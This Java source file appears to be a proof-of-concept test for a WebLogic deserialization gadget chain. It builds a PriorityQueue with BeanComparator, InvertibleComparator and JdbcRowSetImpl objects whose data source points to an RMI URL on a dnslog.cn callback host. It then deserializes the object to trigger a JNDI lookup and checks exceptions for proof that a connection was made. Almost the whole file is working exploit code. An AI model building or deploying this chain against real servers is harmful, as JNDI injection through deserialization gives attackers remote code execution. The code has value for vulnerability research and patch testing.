import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * Rebuild the WL9 payload INSIDE the container with a DNS callback URL.
 * Then deserialize it. If DNS lookup is triggered, the chain works.
 */
public class DeserTestDNS {
    public static void main(String[] args) throws Exception {
        String dnsCallback = args.length > 0 ? args[0] : "rmi://wl9-test.dnslog.cn/test";

        System.out.println("=== WL9 Chain Test (inside container) ===");
        System.out.println("Callback: " + dnsCallback);

        // Build payload here with full classpath
        Class<?> beanCompClass = Class.forName("org.apache.commons.beanutils.BeanComparator");
        Object beanComp = beanCompClass.getDeclaredConstructor(String.class)
            .newInstance("databaseMetaData");

        Class<?> invCompClass = Class.forName(
            "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator");
        Object invComp = invCompClass.getDeclaredConstructor(Comparator.class)
            .newInstance(beanComp);

        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs1, dnsCallback);
        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs2, dnsCallback);

        PriorityQueue pq = new PriorityQueue(2, (Comparator) invComp);
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        queueField.set(pq, new Object[]{jrs1, jrs2});
        sizeField.set(pq, 2);

        System.out.println("Payload built");

        // Serialize
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(pq);
        oos.close();
        byte[] data = bos.toByteArray();
        System.out.println("Serialized: " + data.length + " bytes");

        // Now deserialize - this should trigger the chain
        System.out.println("Deserializing...");
        try {
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object result = ois.readObject();
            System.out.println("Deserialized: " + result.getClass().getName());
        } catch (Throwable e) {
            System.out.println("Exception: " + e.getClass().getName() + ": " + e.getMessage());

            // Walk the full cause chain looking for JNDI/connect evidence
            Throwable cause = e;
            int depth = 0;
            boolean jndiFound = false;
            while (cause != null && depth < 12) {
                String msg = cause.toString();
                if (msg.contains("javax.naming") || msg.contains("InitialContext")
                    || msg.contains("lookup") || msg.contains("connect")
                    || msg.contains("JNDI") || msg.contains("ConnectException")
                    || msg.contains("CommunicationException") || msg.contains("NamingException")
                    || msg.contains("Connection refused")) {
                    jndiFound = true;
                    System.out.println("[!!!] JNDI/CONNECT EVIDENCE at depth " + depth + ": " + msg);
                }
                System.out.println("  [" + depth + "] " + cause.getClass().getName() + ": " +
                    (cause.getMessage() != null ?
                        (cause.getMessage().length() > 250 ? cause.getMessage().substring(0, 250) : cause.getMessage())
                        : "null"));
                cause = cause.getCause();
                depth++;
            }

            if (jndiFound) {
                System.out.println("\n*** CHAIN CONFIRMED: JNDI/connect triggered during deserialization ***");
            } else {
                System.out.println("\nNo JNDI evidence found. The chain may not reach connect().");
            }
        }
    }
}
